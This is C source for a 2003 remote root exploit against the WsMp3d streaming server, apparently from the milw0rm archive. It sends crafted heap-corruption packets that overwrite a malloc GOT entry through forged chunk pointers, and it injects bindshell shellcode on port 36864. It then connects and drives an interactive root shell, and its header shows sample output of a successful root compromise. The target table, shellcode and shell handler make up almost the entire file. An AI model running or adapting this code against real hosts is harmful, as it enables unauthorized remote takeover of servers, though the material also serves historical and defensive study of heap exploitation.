/*
**
** [*] Title: Remote Heap Corruption Overflow vulnerability in WsMp3d
** [+] Exploit: 0x82-Remote.WsMp3d.again.c
**
** bash$ ./0x82--Remote.WsMp3d.again -h 61.37.xxx.xx -t2
**
**  WsMp3 Server Heap Corruption Remote root exploit
**                                             by Xpl017Elz.
**  [+] Hostname: 61.37.xxx.xx
**  [+] Port num: 8000
**  [+] Retloc address: 0x8058d8c
**  [+] Retaddr address: 0x80648bf
**  [1] #1 Set socket.
**  [2] First, send exploit packet.
**  [3] #2 Set socket.
**  [4] Second, send exploit packet.
**  [5] Waiting, executes the shell ! (3Sec)
**  [6] Trying 61.37.xxx.xx:36864 ...
**  [7] Connected to 61.37.xxx.xx:36864 !
**
**  [*] Executed shell successfully !
**
** Linux xpl017elz 2.2.12-20kr #1 Tue Oct 12 17:08:15 KST 1999 i586 unknown
** uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),
** 6(disk),10(wheel)
** bash#
**
**
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>

struct op_plat_st
{
	int op_plat_num;
	char *op_plat_sys;
	u_long retloc;
	u_long retaddr;
	int off_st;
};
struct op_plat_st __pl_form[]=
{
	/*{num,linux,globl val,heap val}*/
	{0,"Linux WsMp3 Binary I (Default)",0x08059490,0x08064e8f,0},
	{1,"Linux WsMp3 Binary II (Default)",0x08059490,0x08063e97,0},
	//08058d8c R_386_JUMP_SLOT   malloc
	{2,"RedHat Linux 6.1 (Compile)",0x08058d8c,0x080648bf,0},
	{3,"RedHat Linux 6.2 (Compile)",0x08058d8c,0x080646f3,0},
	{4,"RedHat Linux 7.0 (Compile)",0x0809aa68,0x080a5cb3,0},
	{5,"Linux all DoS (Compile)",0x82828282,0x82828282,0},
/*	{6,"RedHat Linux 7.1",0x0,0x0,1},
	{7,"RedHat Linux 8.0",0x0,0x82828282,1},
	{8,"RedHat Linux 9.0",0x0,0x82828282,1},
*/
	{0x82,NULL,0,0,0}
};

int sexsock(char *conn_host_nm,int conn_port_nm);
void start_shell(int st_sock_va);
void re_connt_lm(int st_sock_va);
void __xpl_banrl();
void x_fp_rm_usage(char *x_fp_rm);
int __eat_sucks_heap_data_send(int st_sock_va,u_long fd_sx,u_long bk_sx);

void __xpl_banrl()
{
	fprintf(stdout,"\n WsMp3 Server Heap Corruption Remote root exploit (Again)\n");
	fprintf(stdout,"                                            by Xpl017Elz.\n");
}

void x_fp_rm_usage(char *x_fp_rm)
{
	int __t_xmp=0;
	fprintf(stdout,"\n Usage: %s -[option] [arguments]\n\n",x_fp_rm);
	fprintf(stdout,"\t -h [hostname] - target host.\n");
	fprintf(stdout,"\t -p [port]     - port number.\n");
	fprintf(stdout,"\t -r [addr]     - retloc address. (malloc globl)\n");
	fprintf(stdout,"\t -s [addr]     - &shellcode address.\n\n");
	fprintf(stdout," Example> %s -h target_hostname -p 8000\n",x_fp_rm);
	fprintf(stdout," Select target number>\n\n");
	for(;;)
	{
		if(__pl_form[__t_xmp].op_plat_num==(0x82))
			break;
		else
		{
			
fprintf(stdout,"\t {%d} %s\n",__pl_form[__t_xmp].op_plat_num,__pl_form[__t_xmp].op_plat_sys);
		}
		__t_xmp++;
	}
	fprintf(stdout,"\n");
	exit(0);
}

/*
** name: desc->action (free)
** content: chat cmd ("CHA")
** content size: 3
** buffer size: 4+12 (Bin:1000[0])
**
** name: desc->what
** content: garbage (clear)
** content size: 1024
** buffer size: 4+4+1+1024 (Bin:1000000100[1])
*/

int __eat_sucks_heap_data_send(int st_sock_va,u_long fd_sx,u_long bk_sx)
{
	int wy_clean_data_q;
	char nop_n_jump[]={0x42,0x0c,0xeb,0x41};
	int atk_buf_pos=0;
	char oxa_oxd[]={0x0a,0x0d};
#define PORT_Q (36864)
#define __CLN_DT_LEN ((0x00000400)+(0x00000001))
	char step_atk_code_st[PORT_Q];
#define __OF_BY_ONE (0x01)
	char p_rev_size[]={0xfc,0xff,0xff,0xff}; /* chunk size */
	char __size_fd[]={0xff,0xff,0xff,0xff}; /* data section size */
	char cln_dt_buf[__CLN_DT_LEN];
	char chat_inf_send_code[]={0x43,0x48,0x41};
	char shellcode[]={
		/* bindshell port 36864 */
		0xeb,0x72,0x5e,0x29,0xc0,0x89,0x46,0x10,
		0x40,0x89,0xc3,0x89,0x46,0x0c,0x40,0x89,
		0x46,0x08,0x8d,0x4e,0x08,0xb0,0x66,0xcd,
		0x80,0x43,0xc6,0x46,0x10,0x10,0x66,0x89,
		0x5e,0x14,0x88,0x46,0x08,0x29,0xc0,0x89,
		0xc2,0x89,0x46,0x18,0xb0,0x90,0x66,0x89,
		0x46,0x16,0x8d,0x4e,0x14,0x89,0x4e,0x0c,
		0x8d,0x4e,0x08,0xb0,0x66,0xcd,0x80,0x89,
		0x5e,0x0c,0x43,0x43,0xb0,0x66,0xcd,0x80,
		0x89,0x56,0x0c,0x89,0x56,0x10,0xb0,0x66,
		0x43,0xcd,0x80,0x86,0xc3,0xb0,0x3f,0x29,
		0xc9,0xcd,0x80,0xb0,0x3f,0x41,0xcd,0x80,
		0xb0,0x3f,0x41,0xcd,0x80,0x88,0x56,0x07,
		0x89,0x76,0x0c,0x87,0xf3,0x8d,0x4b,0x0c,
		0xb0,0x0b,0xcd,0x80,0xe8,0x89,0xff,0xff,
		0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
	};
	int send_shcode_lsz=sizeof(shellcode);

	memset((char *)cln_dt_buf,0x82,sizeof(cln_dt_buf));
	memset((char *)step_atk_code_st,0,sizeof(step_atk_code_st));
	/*
	desc->action:malloc(10); // cleanup
	*/
	memcpy(step_atk_code_st+atk_buf_pos,chat_inf_send_code,sizeof(chat_inf_send_code));
	atk_buf_pos+=(sizeof(chat_inf_send_code));
	memset(step_atk_code_st+atk_buf_pos,0x20,__OF_BY_ONE);
	atk_buf_pos+=(__OF_BY_ONE);
	/*
	void rem_req_descriptor(req_descriptor *desc);
	desc->what[sizeof(desc->what)]='\0';free(desc->what);desc->what=NULL;
	*/
	memcpy(step_atk_code_st+atk_buf_pos,cln_dt_buf,sizeof(cln_dt_buf));
	atk_buf_pos+=(sizeof(cln_dt_buf));
	/* chunk size */
	memcpy(step_atk_code_st+atk_buf_pos,p_rev_size,sizeof(p_rev_size));
	atk_buf_pos+=(sizeof(p_rev_size));
	/* data section size */
	memcpy(step_atk_code_st+atk_buf_pos,__size_fd,sizeof(__size_fd));
	atk_buf_pos+=(sizeof(__size_fd));
	{
		*(long *)&step_atk_code_st[atk_buf_pos]=(fd_sx-(0x0c));
		atk_buf_pos+=4; /* forward ptr */
		*(long *)&step_atk_code_st[atk_buf_pos]=(bk_sx);
		atk_buf_pos+=4; /* back ptr */
	}
	memset(step_atk_code_st+atk_buf_pos,0x20,__OF_BY_ONE);
	atk_buf_pos+=(__OF_BY_ONE);
	for(wy_clean_data_q=0;wy_clean_data_q<0x190;wy_clean_data_q+=4)
	{
		memcpy(step_atk_code_st+atk_buf_pos,nop_n_jump,sizeof(nop_n_jump));
		atk_buf_pos+=(sizeof(nop_n_jump));
	}
	memcpy(step_atk_code_st+atk_buf_pos,shellcode,sizeof(shellcode));
	atk_buf_pos+=(sizeof(shellcode));
	memcpy(step_atk_code_st+atk_buf_pos,oxa_oxd,sizeof(oxa_oxd));
	atk_buf_pos+=(sizeof(oxa_oxd));

	send(st_sock_va,step_atk_code_st,strlen(step_atk_code_st),0);
	return(st_sock_va);
}

int main(int argc,char *argv[])
{
	int sock,tg_sk;
#define D_PORT (8000)
#define ATK_CPT (36864)
	int port=(D_PORT);
#define D_HOST "x82.inetcop.org"
	char hostname[0x82]=D_HOST;
	int whlp,type=0;

	u_long retloc=__pl_form[type].retloc;
	u_long retaddr=__pl_form[type].retaddr;

	(void)__xpl_banrl();
	while((whlp=getopt(argc,argv,"T:t:R:r:S:s:H:h:P:p:IiXx"))!=EOF)
	{
		extern char *optarg;
		switch(whlp)
		{
			case 'T':
			case 't':
				if((type=atoi(optarg))<6)
				{
					retloc=__pl_form[type].retloc;
					retaddr=__pl_form[type].retaddr;
				}
				else (void)x_fp_rm_usage(argv[0]);
				break;

			case 'R':
			case 'r':
				retloc=strtoul(optarg,NULL,0);
				break;
				
			case 'S':
			case 's':
				retaddr=strtoul(optarg,NULL,0);
				break;
				
			case 'H':
			case 'h':
				memset((char *)hostname,0,sizeof(hostname));
				strncpy(hostname,optarg,sizeof(hostname)-1);
				break;
				
			case 'P':
			case 'p':
				port=atoi(optarg);
				break;
				
			case 'I':
			case 'i':
				fprintf(stderr," Try `%s -?' for more information.\n\n",argv[0]);
				exit(-1);
				
			case '?':
				(void)x_fp_rm_usage(argv[0]);
				break;
		}
	}
	
	if(!strcmp(hostname,D_HOST))
	{
		(void)x_fp_rm_usage(argv[0]);
	}
	{
		fprintf(stdout," [+] Hostname: %s\n",hostname);
		fprintf(stdout," [+] Port num: %d\n",port);
		fprintf(stdout," [+] Retloc address: %p\n",retloc);
		fprintf(stdout," [+] Retaddr address: %p\n",retaddr);
	}
	fprintf(stdout," [1] #1 Set socket.\n");
	sock=(int)sexsock(hostname,port);
	(void)re_connt_lm(sock);
	
	fprintf(stdout," [2] First, send exploit packet.\n");
	sock=(int)__eat_sucks_heap_data_send(sock,retloc,retaddr);
	close(sock);
	
	fprintf(stdout," [3] #2 Set socket.\n");
	sock=(int)sexsock(hostname,port);
	(void)re_connt_lm(sock);
	
	fprintf(stdout," [4] Second, send exploit packet.\n");
	sock=(int)__eat_sucks_heap_data_send(sock,retloc,retaddr);
	
	fprintf(stdout," [5] Waiting, executes the shell ! (3Sec)\n");
	sleep(3);
	
	fprintf(stdout," [6] Trying %s:%d ...\n",hostname,(ATK_CPT));
	tg_sk=(int)sexsock(hostname,(ATK_CPT));
	(void)re_connt_lm(tg_sk);

	fprintf(stdout," [7] Connected to %s:%d !\n\n",hostname,(ATK_CPT));
	(void)start_shell(tg_sk);

	exit(0);
}

int sexsock(char *conn_host_nm,int conn_port_nm)
{
	int sock;
	struct hostent *sxp;
	struct sockaddr_in sxp_addr;
 
	if((sxp=gethostbyname(conn_host_nm))==NULL)
	{
		herror(" [-] gethostbyname() error");
		return(-1);
	}
	if((sock=socket(AF_INET,SOCK_STREAM,0))==-1)
	{
		perror(" [-] socket() error");
		return(-1);
	}
	sxp_addr.sin_family=AF_INET;
	sxp_addr.sin_port=htons(conn_port_nm);
	sxp_addr.sin_addr=*((struct in_addr*)sxp->h_addr);
	bzero(&(sxp_addr.sin_zero),8);

	if(connect(sock,(struct sockaddr *)&sxp_addr,sizeof(struct sockaddr))==-1)
	{
		perror(" [-] connect() error");
		return(-1);
	}

	return(sock);
}

void start_shell(int st_sock_va)
{
	int died;
	char *command="uname -a; id; export TERM=vt100; exec bash -i\n";
	char readbuf[1024];
	fd_set rset;
	memset((char *)readbuf,0,sizeof(readbuf));
	fprintf(stdout," [*] Executed shell successfully !\n\n");
	send(st_sock_va,command,strlen(command),0);

	for(;;)
	{
		fflush(stdout);
		FD_ZERO(&rset);
		FD_SET(st_sock_va,&rset);
		FD_SET(STDIN_FILENO,&rset);
		select(st_sock_va+1,&rset,NULL,NULL,NULL);

		if(FD_ISSET(st_sock_va,&rset))
		{
			died=read(st_sock_va,readbuf,sizeof(readbuf)-1);
			if(died<=0)
				exit(0);
			readbuf[died]=0;
			fprintf(stdout,"%s",readbuf);
		}
		if(FD_ISSET(STDIN_FILENO,&rset))
		{
			died=read(STDIN_FILENO,readbuf,sizeof(readbuf)-1);
			if(died>0)
			{
				readbuf[died]=0;
				write(st_sock_va,readbuf,died);
			}
		}
	}
	return;
}

void re_connt_lm(int st_sock_va)
{
	if(st_sock_va==-1)
	{
		fprintf(stdout," [-] Failed.\n\n");
		fprintf(stdout," Happy Exploit ! :-)\n\n");
		exit(-1);
	}
}


// milw0rm.com [2003-05-22]
